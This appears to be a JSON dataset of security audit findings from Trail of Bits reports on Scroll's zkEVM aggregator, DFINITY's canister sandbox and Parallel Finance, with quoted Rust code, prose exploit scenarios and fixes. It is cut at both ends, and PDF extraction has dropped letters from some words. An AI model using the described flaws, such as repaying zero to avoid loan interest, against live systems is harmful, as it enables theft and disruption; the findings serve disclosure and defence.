batch_data_hash rows in the Keccak table were forced to be empty, the RLC checks could not succeed during this attack; for example, by constraining all three data length elds in gure 10.7 instead of constraining only one of them, it would not have been possible to put A.data_hash in the second row.  If the RLC check in gure 10.9 explicitly selected which rows RLC should be checked using the flag variables, the rst row could not have been lled with attacker-controlled data.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "11. RlcCong::rlc_with_ag is incorrect ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "The RlcConfig::rlc_with_flag function combines a vector of eld elements and a vector of ag values with a random challenge. The documentation comment on this function, shown in gure 11.1, suggests that the ag array should act like a mask on the vector; that is, entries in the vector with a ag of 0 should be set to 0: // Returns challenge^k * inputs[0] * flag[0] + ... + challenge * inputs[k-1] * flag[k-1]] + // inputs[k]* flag[k] Figure 11.1: aggregator/src/aggregation/rlc/gates.rs#342343 The two test cases for this function, shown in gure 11.2, as well as its use in the aggregation circuit, suggest an alternate intended functionality where entries with a ag value equal to 0 are simply removed from the vector before the RLC occurs: // unit test: rlc with flags { let zero = config.load_private(&mut region, &Fr::zero(), &mut offset)?; let one = config.not(&mut region, &zero, &mut offset)?; let flag = [one.clone(), one.clone(), one.clone(), one.clone()]; let f6_rec = config.rlc_with_flag(&mut region, &inputs, &f5, &flag, &mut offset)?; region.constrain_equal(f6.cell(), f6_rec.cell())?; let flag = [one.clone(), one.clone(), one, zero]; let res = rlc(&[self.f1, self.f2, self.f3], &self.f5); let res = config.load_private(&mut region, &res, &mut offset)?; let res_rec = config.rlc_with_flag(&mut region, &inputs, &f5, &flag, &mut offset)?; region.constrain_equal(res.cell(), res_rec.cell())?; } Figure 11.2: aggregator/src/tests/rlc/gates.rs#125141 Regardless of whichever functionality is the intended one, rlc_with_flag, shown in gure 11.3, is incorrect: pub(crate) fn rlc_with_flag( &self, region: &mut Region<Fr>, inputs: &[AssignedCell<Fr, Fr>], challenge: &AssignedCell<Fr, Fr>, flags: &[AssignedCell<Fr, Fr>], offset: &mut usize, ) -> Result<AssignedCell<Fr, Fr>, Error> { assert!(flags.len() == inputs.len()); let mut acc = inputs[0].clone(); for (input, flag) in inputs.iter().zip(flags.iter()).skip(1) { let tmp = self.mul_add(region, &acc, challenge, input, offset)?; acc = self.select(region, &tmp, &acc, flag, offset)?; } Ok(acc) } Figure 11.3: aggregator/src/aggregation/rlc/gates.rs#344360 If the ags are supposed to act as a lter, only the handling of flags[0] needs to change (e.g., to the version shown in gure 11.4). pub(crate) fn rlc_with_flag( &self, region: &mut Region<Fr>, inputs: &[AssignedCell<Fr, Fr>], challenge: &AssignedCell<Fr, Fr>, flags: &[AssignedCell<Fr, Fr>], offset: &mut usize, ) -> Result<AssignedCell<Fr, Fr>, Error> { assert!(flags.len() == inputs.len()); let mut acc = self.mul(region, &inputs[0], &flags[0], offset)?; for (input, flag) in inputs.iter().zip(flags.iter()).skip(1) { let tmp = self.mul_add(region, &acc, challenge, input, offset)?; acc = self.select(region, &tmp, &acc, flag, offset)?; } Ok(acc) } Figure 11.4: A x for rlc_with_flag if the ags should act like lters If the behavior is supposed to match the documentation comment, the function should be rewritten to unconditionally multiply acc by challenge and to conditionally add input, as shown in gure 11.5. pub(crate) fn rlc_with_flag( &self, region: &mut Region<Fr>, inputs: &[AssignedCell<Fr, Fr>], challenge: &AssignedCell<Fr, Fr>, flags: &[AssignedCell<Fr, Fr>], offset: &mut usize, ) -> Result<AssignedCell<Fr, Fr>, Error> { assert!(flags.len() == inputs.len()); let mut acc = self.mul(region, &inputs[0], &flags[0], offset)?; for (input, flag) in inputs.iter().zip(flags.iter()).skip(1) { let tmp = self.mul(region, input, flag, offset)?; acc = self.mul_add(region, &acc, challenge, &tmp, offset)?; } Ok(acc) } Figure 11.5: A x for rlc_with_flag if the ags should act like masks Because this function is used only in the conditional_constraints function, the impact of this issue is minimal, and all potential issues we found would also be xed by addressing nding TOB-SCROLL3-10. Recommendations Short term, determine the correct behavior of rlc_with_flag and update the implementation to reect that behavior. Long term, test critical functions such as rlc_with_flag on as broad a set of inputs as possible. Consider adding a property-based testing framework such as proptest to test functions over a broad chunk of the input space using random inputs. The property for any vector v, rlc_with_test(v,vec![0; v.len()]) == 0 would have found this problem.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "12. Accumulator representation assumes xed-length eld limbs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "KZG accumulators are pairs of elliptic curve points and must be uniquely serialized when included in the public inputs when verifying SHPLONK proofs. This serialization is done by the flatten_accumulator function from the snark-verifier-sdk crate, as shown in gures 12.1 and 12.2. instances from previous accumulators) // extract the assigned values for // - instances which are the public inputs of each chunk (prefixed with 12 // // - new accumulator to be verified on chain // let (assigned_aggregation_instances, acc) = aggregate::<Kzg<Bn256, Bdfg21>>( &self.svk, &loader, &self.snarks_with_padding, self.as_proof(), );  // extract the following cells for later constraints // - the accumulators // - the public inputs from each snark accumulator_instances.extend(flatten_accumulator(acc).iter().copied()); // the snark is not a fresh one, assigned_instances already contains an // accumulator so we want to skip the first 12 elements from the public input snark_inputs.extend( assigned_aggregation_instances .iter() .flat_map(|instance_column| instance_column.iter().skip(ACC_LEN)), ); config.range().finalize(&mut loader.ctx_mut()); loader.ctx_mut().print_stats(&[\"Range\"]); Ok((accumulator_instances, snark_inputs)) Figure 12.1: aggregator/src/aggregation/circuit.rs#226 pub fn flatten_accumulator<'a>( accumulator: KzgAccumulator<G1Affine, Rc<Halo2Loader<'a>>>, ) -> Vec<AssignedValue<Fr>> { let KzgAccumulator { lhs, rhs } = accumulator; let lhs = lhs.into_assigned(); let rhs = rhs.into_assigned(); lhs.x .truncation .limbs .into_iter() .chain(lhs.y.truncation.limbs.into_iter()) .chain(rhs.x.truncation.limbs.into_iter()) .chain(rhs.y.truncation.limbs.into_iter()) .collect() } Figure 12.2: snark-verifier-sdk/src/aggregation.rs#4459 This function does not check or include the lengths of the truncation vectors in this serialization. This is not an active problem because, to our knowledge, the current nite eld implementations in the halo2-ecc library guarantee that truncation vectors are always a xed size. However, if halo2-ecc allows variable-length truncation vectors, it may be possible for two dierent accumulators to serialize to the same array. This should be documented as an assumption made about snark-verifier-sdk and halo2-ecc, and care should be taken when updating halo2-ecc or snark-verifier-sdk in case this behavior changes. Recommendations Short term, document this requirement and consider adding assertions to flatten_accumulator. Long term, document all serialization formats used in the aggregator implementation and ensure that those formats fulll any assumptions made about them.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "13. PlonkProof::read ignores extra entries in num_challenge ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "Due to the PlonkProof::read functions use of the zip() function shown in gure 13.1, it is possible for a single proof to be veried using two dierent Protocol values, where one has extra entries in the num_challenge eld. let (witnesses, challenges) = { let (witnesses, challenges): (Vec<_>, Vec<_>) = protocol .num_witness .iter() .zip(protocol.num_challenge.iter()) .map(|(&n, &m)| { (transcript.read_n_ec_points(n).unwrap(), transcript.squeeze_n_challenges(m)) }) .unzip(); ( ) }; witnesses.into_iter().flatten().collect_vec(), challenges.into_iter().flatten().collect_vec(), Figure 13.1: snark-verifier/src/verifier/plonk.rs#155169 This does not appear to be exploitable as is, but code calling the PlonkProof::read function should be careful not to rely on Protocol values to be unique. Recommendations Short term, replace this zip() call with zip_eq() or document this behavior of PlonkProof::read. Long term, review all calls to zip() to ensure that the calling code behaves correctly on non-equal-length inputs.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "1. Aggregated public input hash does not include coinbase or di\u0000culty ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "The public input hash of an aggregated proof represents the public inputs of all SNARKs that the proof aggregates. In the case of zkEVM chunks, the public inputs include commitments to the overall EVM states before and after the chunk and the data included in the blocks of the chunk, as illustrated by the ChunkHash struct, shown in gure 1.1. pub struct ChunkHash { /// Chain identifier pub chain_id: u64, /// state root before this chunk pub prev_state_root: H256, /// state root after this chunk pub post_state_root: H256, /// the withdraw root after this chunk pub withdraw_root: H256, /// the data hash of this chunk pub data_hash: H256, /// if the chunk is a padded chunk pub is_padding: bool, } Figure 1.1: aggregator/src/chunk.rs#1831 The data hash does not include all elds of the BlockContext struct, as shown in gure 1.2. Some elds in BlockContext, shown in gure 1.3, are included in the public input hash through other mechanisms; for example, chain_id is used directly to calculate chunk_pi_hash. However, the coinbase and difficulty elds are not included. iter::empty() // Block Values .chain(b_ctx.number.as_u64().to_be_bytes()) .chain(b_ctx.timestamp.as_u64().to_be_bytes()) .chain(b_ctx.base_fee.to_be_bytes()) .chain(b_ctx.gas_limit.to_be_bytes()) .chain(num_txs.to_be_bytes()) Figure 1.2: aggregator/src/chunk.rs#6874 pub struct BlockContext { /// The address of the miner for the block pub coinbase: Address, /// The gas limit of the block pub gas_limit: u64, /// The number of the block pub number: Word, /// The timestamp of the block pub timestamp: Word, /// The difficulty of the block pub difficulty: Word, /// The base fee, the minimum amount of gas fee for a transaction pub base_fee: Word, /// The hash of previous blocks pub history_hashes: Vec<Word>, /// The chain id pub chain_id: u64, /// Original Block from geth pub eth_block: eth_types::Block<eth_types::Transaction>, } Figure 1.3: zkevm-circuits/src/witness/block.rs#204223 The zkevm-circuits specication draft describes these elds as constants, so they do not need to be included individually in each chunks hash, but they should be committed to through some mechanism. Recommendations Short term, add coinbase and difficulty to the aggregated public input hash. Long term, develop a specication for how all chain constants such as chain_id, coinbase, and difficulty should be treated when committing to them in the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "10. Incorrect state transitions can be proven for any chunk by manipulating padding ags ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "Due to insucient constraints in the aggregation circuits padding logic, a malicious prover can generate two types of invalid proofs:",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "14. MAX_AGG_SNARKS values other than 10 may misbehave ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-scroll-zkEVM-wave3-securityreview.pdf",
        "body": "The aggregation circuit takes n SNARKs and aggregates them into a batch proof that proves their correctness. The value n is represented in the aggregation circuit by the constant MAX_AGG_SNARKS, which is currently set to 10. /// Max number of snarks to be aggregated in a chunk. /// If the input size is less than this, dummy snarks /// will be padded. // TODO: update me(?) pub const MAX_AGG_SNARKS: usize = 10; Figure 14.1: aggregator/src/constants.rs#5660 The implementation of the aggregation circuit is strongly coupled with a MAX_AGG_SNARKS value of 10. For instance, the layout of the batch_data_hash portion of the Keccak table expects to have exactly three rounds of the Keccak permutation. While this logic appears to work for the values 9, 10, 11, and 12, it is not obvious whether a value of 8 would cause problems. Consequently, future updates of MAX_AGG_SNARKS may require a non-trivial amount of the circuit to be rewritten. // #valid snarks | offset of data hash | flags // 1,2,3,4 // 5,6,7,8 // 9,10 | 1, 0, 0 | 0, 1, 0 | 0, 0, 1 | 0 | 32 | 64 Figure 14.2: aggregator/src/core.rs#507510 During this assessment, we treated MAX_AGG_SNARKS as a constant equal to 10, and we did not thoroughly evaluate whether the implementation behaves correctly for values other than 10. Care should be taken if MAX_AGG_SNARKS needs to be changed for any reason. Recommendations Short term, document the assumptions that each component makes about MAX_AGG_SNARKS, and add assertions to enforce those assumptions during circuit construction. Long term, evaluate the behavior of the aggregator implementation for values of MAX_AGG_SNARKS other than 10, and if other values need to be used, consider refactoring the code to use MAX_AGG_SNARKS in a generic fashion. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "1. The canister sandbox has vulnerable dependencies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf",
        "body": "The canister sandbox codebase uses the following vulnerable or unmaintained Rust dependencies. (All of the crates listed are indirect dependencies of the codebase.) Dependency Version ID",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Complete environment of the replica is passed to the sandboxed process ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf",
        "body": "When the spawn_socketed_process function spawns a new sandboxed process, the call to the Command::spawn method passes the entire environment of the replica to the sandboxed process. pub fn spawn_socketed_process( exec_path: &str, argv: &[String], socket: RawFd, ) -> std::io::Result<Child> { let mut cmd = Command::new(exec_path); cmd.args(argv); // In case of Command we inherit the current process's environment. This should // particularly include things such as Rust backtrace flags. It might be // advisable to filter/configure that (in case there might be information in // env that the sandbox process should not be privy to). // The following block duplicates sock_sandbox fd under fd 3, errors are // handled. unsafe { cmd.pre_exec(move || { let fd = libc::dup2(socket, 3); if fd != 3 { return Err(std::io::Error::last_os_error()); } Ok(()) }) }; let child_handle = cmd.spawn()?; Ok(child_handle) } Figure 2.1: canister_sandbox/common/src/process.rs:17- The DFINITY team does not use environment variables for sensitive information. However, sharing the environment with the sandbox introduces a latent risk that system conguration data or other sensitive data could be leaked to the sandboxed process in the future. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. Since the environment of the replica was leaked to the sandbox when the process was created, the canister gains information about the system that it is running on and learns sensitive information passed as environment variables to the replica, making further eorts to compromise the system easier. Recommendations Short term, add code that lters the environment passed to the sandboxed process (e.g., Command::env_clear or Command::env_remove) to ensure that no sensitive information is leaked if the sandbox is compromised.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. SELinux policy allows the sandbox process to write replica log messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf",
        "body": "When a new sandboxed process is spawned using Command::spawn, the processs stdin, stdout, and stderr le descriptors are inherited from the parent process. The SELinux policy for the canister sandbox currently allows sandboxed processes to read from and write to all le descriptors inherited from the replica (the le descriptors created by init when the replica is started, as well as the le descriptor used for interprocess RPC). As a result, a compromised sandbox could spoof log messages to the replica's stdout or stderr. # Allow to use the logging file descriptor inherited from init. # This should actually not be allowed, logs should be routed through # replica. allow ic_canister_sandbox_t init_t : fd { use }; allow ic_canister_sandbox_t init_t : unix_stream_socket { read write }; Figure 3.1: guestos/rootfs/prep/ic-node/ic-node.te:312-316 Additionally, sandboxed processes read and write access to les with the tmpfs_t context appears to be overly broad, but considering the fact that sandboxed processes are not allowed to open les, we did not see any way to exploit this. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. By writing fake log messages to the replicas stderr le descriptor, the canister makes it look like the replica has other issues, masking the compromise and making incident response more dicult. Recommendations Short term, change the SELinux policy to disallow sandboxed processes from reading from and writing to the inherited le descriptors stdin, stdout, and stderr.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Canister sandbox system calls are not ltered using Seccomp ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf",
        "body": "Seccomp provides a framework to lter outgoing system calls. Using Seccomp, a process can limit the type of system calls available to it, thereby limiting the available attack surface of the kernel. The current implementation of the canister sandbox does not use Seccomp; instead, it relies on mandatory access controls (via SELinux) to restrict the system calls available to a sandboxed process. While SELinux is useful for restricting access to les, directories, and other processes, Seccomp provides more ne-grained control over kernel system calls and their arguments. For this reason, Seccomp (in particular, Seccomp-BPF) is a useful complement to SELinux in restricting a sandboxed processs access to the system. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. By exploiting a vulnerability in the kernel, it is able to break out of the sandbox and execute arbitrary code on the node. Recommendations Long term, consider using Seccomp-BPF to restrict the system calls available to a sandboxed process. Extra care must be taken when the canister sandbox (or any of its dependencies) is updated to ensure that the set of system calls invoked during normal execution has not changed.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Invalid system state changes cause the replica to panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf",
        "body": "When a sandboxed process has completed an execution request, the hypervisor calls SystemStateChanges::apply_changes (in Hypervisor::execute) to apply the system state changes to the global canister system state. pub fn apply_changes(self, system_state: &mut SystemState) { // Verify total cycle change is not positive and update cycles balance. assert!(self.cycle_change_is_valid( system_state.canister_id == CYCLES_MINTING_CANISTER_ID )); self.cycles_balance_change .apply_ref(system_state.balance_mut()); // Observe consumed cycles. system_state .canister_metrics .consumed_cycles_since_replica_started += NominalCycles::from_cycles(self.cycles_consumed); // Verify we don't accept more cycles than are available from each call // context and update each call context balance if !self.call_context_balance_taken.is_empty() { let call_context_manager = system_state.call_context_manager_mut().unwrap(); for (context_id, amount_taken) in &self.call_context_balance_taken { let call_context = call_context_manager .call_context_mut(*context_id) .expect(\"Canister accepted cycles from invalid call context\"); call_context .withdraw_cycles(*amount_taken) .expect(\"Canister accepted more cycles than available ...\"); } } // Push outgoing messages. for msg in self.requests { system_state .push_output_request(msg) .expect(\"Unable to send new request\"); } // Verify new certified data isn't too long and set it. if let Some(certified_data) = self.new_certified_data.as_ref() { assert!(certified_data.len() <= CERTIFIED_DATA_MAX_LENGTH as usize); system_state.certified_data = certified_data.clone(); } // Verify callback ids and register new callbacks. for update in self.callback_updates { match update { CallbackUpdate::Register(expected_id, callback) => { let id = system_state .call_context_manager_mut() .unwrap() .register_callback(callback); assert_eq!(id, expected_id); } CallbackUpdate::Unregister(callback_id) => { let _callback = system_state .call_context_manager_mut() .unwrap() .unregister_callback(callback_id) .expect(\"Tried to unregister callback with an id ...\"); } } } } Figure 5.1: system_api/src/sandbox_safe_system_state.rs:99-157 The apply_changes method uses assert and expect to ensure that system state invariants involving cycle balances, call contexts, and callback updates are upheld. By sending a WebAssembly (Wasm) execution output with invalid system state changes, a compromised sandboxed process could use this to cause the replica to panic. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. The canister sends a Wasm execution output message containing invalid state changes to the replica, which causes the replica process to panic, crashing the entire subnet. Recommendations Short term, revise SystemStateChanges::apply_changes so that it returns an error if the system state changes from a sandboxed process are found to be invalid. Long term, audit the codebase for the use of panicking functions and macros like assert, unreachable, unwrap, or expect in code that validates data from untrusted sources.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. SandboxedExecutionController does not enforce memory size invariants ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/DFINITYCanisterSandbox.pdf",
        "body": "When a sandboxed process has completed an execution request, the execution state is updated by the SandboxedExecutionController::process method with the data from the execution output. // Unless execution trapped, commit state (applying execution state // changes, returning system state changes to caller). let system_state_changes = if exec_output.wasm.wasm_result.is_ok() { if let Some(state_modifications) = exec_output.state { // TODO: If a canister has broken out of wasm then it might have allocated // more wasm or stable memory than allowed. We should add an additional // check here that the canister is still within its allowed memory usage. execution_state .wasm_memory .page_map .deserialize_delta(state_modifications.wasm_memory.page_delta); execution_state.wasm_memory.size = state_modifications.wasm_memory.size; execution_state.wasm_memory.sandbox_memory = SandboxMemory::synced( wrap_remote_memory(&sandbox_process, next_wasm_memory_id), ); execution_state .stable_memory .page_map .deserialize_delta(state_modifications.stable_memory.page_delta); execution_state.stable_memory.size = state_modifications.stable_memory.size; execution_state.stable_memory.sandbox_memory = SandboxMemory::synced( wrap_remote_memory(&sandbox_process, next_stable_memory_id), ); // ... <redacted> state_modifications.system_state_changes } else { SystemStateChanges::default() } } else { SystemStateChanges::default() }; Figure 6.1: replica_controller/src/sandboxed_execution_controller.rs:663 However, the code does not validate the Wasm and stable memory sizes against the corresponding page maps. This means that a compromised sandbox could report a Wasm or stable memory size of 0 along with a non-empty page map. Since these memory sizes are used to calculate the total memory used by the canister in ExecutionState::memory_usage, this lack of validation could allow the canister to use up cycles normally reserved for memory use. pub fn memory_usage(&self) -> NumBytes { // We use 8 bytes per global. let globals_size_bytes = 8 * self.exported_globals.len() as u64; let wasm_binary_size_bytes = self.wasm_binary.binary.len() as u64; num_bytes_try_from(self.wasm_memory.size) .expect(\"could not convert from wasm memory number of pages to bytes\") + num_bytes_try_from(self.stable_memory.size) .expect(\"could not convert from stable memory number of pages to bytes\") + NumBytes::from(globals_size_bytes) + NumBytes::from(wasm_binary_size_bytes) } Figure 6.2: replicated_state/src/canister_state/execution_state.rs:411421 Canister memory usage aects how much the cycles account manager charges the canister for resource allocation. If the canister uses best-eort memory allocation, the implementation calls through to ExecutionState::memory_usage to compute how much memory the canister is using. pub fn charge_canister_for_resource_allocation_and_usage( &self, log: &ReplicaLogger, canister: &mut CanisterState, duration_between_blocks: Duration, ) -> Result<(), CanisterOutOfCyclesError> { let bytes_to_charge = match canister.memory_allocation() { // The canister has explicitly asked for a memory allocation. MemoryAllocation::Reserved(bytes) => bytes, // The canister uses best-effort memory allocation. MemoryAllocation::BestEffort => canister.memory_usage(self.own_subnet_type), }; if let Err(err) = self.charge_for_memory( &mut canister.system_state, bytes_to_charge, duration_between_blocks, ) { } // ... <redacted> // ... <redacted> } Figure 6.3: cycles_account_manager/src/lib.rs:671 Thus, if a sandboxed process reports a lower memory usage, the cycles account manager will charge the canister less than it should. It is unclear whether this represents expected behavior when a canister breaks out of the Wasm execution environment. Clearly, if the canister is able to execute arbitrary code in the context of a sandboxed process, then the replica has lost all ability to meter and restrict canister execution, which means that accounting for canister cycle and memory use is largely meaningless. Exploit Scenario A malicious canister gains arbitrary code execution within a sandboxed process. The canister reports the wrong memory sizes back to the replica with the execution output. This causes the cycles account manager to miscalculate the remaining available cycles for the canister in the charge_canister_for_resource_allocation_and_usage method. Recommendations Short term, document this behavior and ensure that implicitly trusting the canister output could not adversely aect the replica or other canisters running on the system. Consider enforcing the correct invariants for memory allocations reported by a sandboxed process. The following invariant should always hold for Wasm and stable memory: page_map_size <= memory.size <= MAX_SIZE page_map_size could be computed as memory.page_map.num_host_pages() * PAGE_SIZE.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Vulnerable dependencies in the Substrate parachain ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "body": "The Parallel Finance parachain node uses the following dependencies with known vulnerabilities. (All of the dependencies listed are inherited from the Substrate framework.) Dependency Version ID",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Users can avoid accruing interest by repaying a zero amount ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "body": "To repay borrowed funds, users call the repay_borrow extrinsic. The extrinsic implementation calls the Pallet::repay_borrow_internal method to recompute the loan balance. Pallet::repay_borrow_internal updates the loan balance for the account and resets the borrow index as part of the calculation. fn repay_borrow_internal ( borrower: & T ::AccountId, asset_id: AssetIdOf <T>, account_borrows: BalanceOf <T>, repay_amount: BalanceOf <T>, ) -> DispatchResult { // ... <redacted> AccountBorrows::<T>::insert( asset_id, borrower, BorrowSnapshot { principal: account_borrows_new , borrow_index: Self ::borrow_index(asset_id) , }, ); TotalBorrows::<T>::insert(asset_id, total_borrows_new); Ok (()) } Figure 2.1: pallets/loans/src/lib.rs:1057-1087 The borrow index is used in the calculation of the accumulated interest for the loan in Pallet::current_balance_from_snapshot . Specically, the outstanding balance, snapshot.principal , is multiplied by the quotient of borrow_index divided by snapshot.borrow_index . pub fn current_balance_from_snapshot ( asset_id: AssetIdOf <T>, snapshot: BorrowSnapshot <BalanceOf<T>>, ) -> Result <BalanceOf<T>, DispatchError> { if snapshot.principal.is_zero() || snapshot.borrow_index.is_zero() { return Ok (Zero::zero()); } // Calculate new borrow balance using the interest index: // recent_borrow_balance = snapshot.principal * borrow_index / // snapshot.borrow_index let recent_borrow_balance = Self ::borrow_index(asset_id) .checked_div(&snapshot.borrow_index) .and_then(|r| r.checked_mul_int(snapshot.principal)) .ok_or(ArithmeticError::Overflow)?; Ok (recent_borrow_balance) } Figure 2.2: pallets/loans/src/lib.rs:1106-1121 Therefore, if the snapshot borrow index is updated to Self::borrow_index(asset_id) , the resulting recent_borrow_balance in Pallet::current_balance_from_snapshot will always be equal to snapshot.principal . That is, no interest will be applied to the loan. It follows that the accrued interest is lost whenever part of the loan is repaid. In an extreme case, if the repaid amount passed to repay_borrow is 0 , users could reset the borrow index without repaying anything. The same issue is present in the implementations of the liquidated_transfer and borrow extrinsics as well. Exploit Scenario A malicious user borrows assets from Parallel Finance and calls repay_borrow with a repay_amount of zero. This allows her to avoid paying interest on the loan. Recommendations Short term, modify the code so that the accrued interest is added to the snapshot principal when the snapshot is updated. Long term, add unit tests for edge cases (like repaying a zero amount) to increase the chances of discovering unexpected system behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Missing validation in Pallet::force_update_market ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "body": "The Pallet::force_update_market method can be used to replace the stored market instance for a given asset. Other methods used to update market parameters perform extensive validation of the market parameters, but force_update_market checks only the rate model. pub fn force_update_market ( origin: OriginFor <T>, asset_id: AssetIdOf <T>, market: Market <BalanceOf<T>>, ) -> DispatchResultWithPostInfo { T::UpdateOrigin::ensure_origin(origin)?; ensure!( market.rate_model.check_model(), Error::<T>::InvalidRateModelParam ); let updated_market = Self ::mutate_market(asset_id, |stored_market| { *stored_market = market; stored_market.clone() })?; Self ::deposit_event(Event::<T>::UpdatedMarket(updated_market)); Ok (().into()) } Figure 3.1: pallets/loans/src/lib.rs:539-556 This means that the caller (who is either the root account or half of the general council) could inadvertently change immutable market parameters like ptoken_id by mistake. Exploit Scenario The root account calls force_update_market to update a set of market parameters. By mistake, the ptoken_id market parameter is updated, which means that Pallet::ptoken_id and Pallet::underlying_id are no longer inverses. Recommendations Short term, consider adding more input validation to the force_update_market extrinsic. In particular, it may make sense to ensure that the ptoken_id market parameter has not changed. Alternatively, add validation to check whether the ptoken_id market parameter is updated and to update the UnderlyingAssetId map to ensure that the value matches the Markets storage map.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Missing validation in multiple StakingLedger methods ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
        "body": "The staking ledger is used to keep track of the total amount of staked funds in the system. It is updated in response to cross-consensus messaging (XCM) requests to the parent chain (either Polkadot or Kusama). A number of the StakingLedger methods lack sucient input validation before they update the staking ledgers internal state. Even though the input is validated as part of the original XCM call, there could still be issues due to implementation errors or overlooked corner cases. First, the StakingLedger::rebond method does not use checked arithmetic to update the active balance. The method should also check that the computed unlocking_balance is equal to the input value at the end of the loop to ensure that the system remains consistent. pub fn rebond (& mut self , value: Balance ) { let mut unlocking_balance: Balance = Zero::zero(); while let Some (last) = self .unlocking.last_mut() { if unlocking_balance + last.value <= value { unlocking_balance += last.value; self .active += last.value; self .unlocking.pop(); } else { let diff = value - unlocking_balance; unlocking_balance += diff; self .active += diff; last.value -= diff; } if unlocking_balance >= value { break ; } } } Figure 4.1: pallets/liquid-staking/src/types.rs:199-219 Second, the StakingLedger::bond_extra method does not use checked arithmetic to update the total and active balances . pub fn bond_extra (& mut self , value: Balance ) { self .total += value; self .active += value; } Figure 4.2: pallets/liquid-staking/src/types.rs:223-226 Finally, the StakingLedger::unbond method does not use checked arithmetic when updating the active balance. pub fn unbond (& mut self , value: Balance , target_era: EraIndex ) { if let Some ( mut chunk) = self .unlocking .last_mut() .filter(|chunk| chunk.era == target_era) { // To keep the chunk count down, we only keep one chunk per era. Since // `unlocking` is a FIFO queue, if a chunk exists for `era` we know that // it will be the last one. chunk.value = chunk.value.saturating_add(value); } else { self .unlocking.push(UnlockChunk { value, era: target_era , }); }; // Skipped the minimum balance check because the platform will // bond `MinNominatorBond` to make sure: // 1. No chill call is needed // 2. No minimum balance check self .active -= value; } Figure 4.3: pallets/liquid-staking/src/types.rs:230-253 Since the staking ledger is updated by a number of the XCM response handlers, and XCM responses may return out of order, it is important to ensure that input to the staking ledger methods is validated to prevent issues due to race conditions and corner cases. We could not nd a way to exploit this issue, but we cannot rule out the risk that it could be used to cause a denial-of-service condition in the system. Exploit Scenario The staking ledger's state is updated as part of a WithdrawUnbonded request, leaving the unlocking vector in the staking ledger empty. Later, when the response to a previous call to rebond is handled, the ledger is updated again, which leaves it in an inconsistent state. Recommendations Short term, ensure that the balance represented by the staking ledgers unlocking vector is enough to cover the input balance passed to StakingLedger::rebond . Use checked arithmetic in all staking ledger methods that update the ledgers internal state to ensure that issues due to data races are detected and handled correctly.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Failed XCM requests left in storage ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance.pdf",
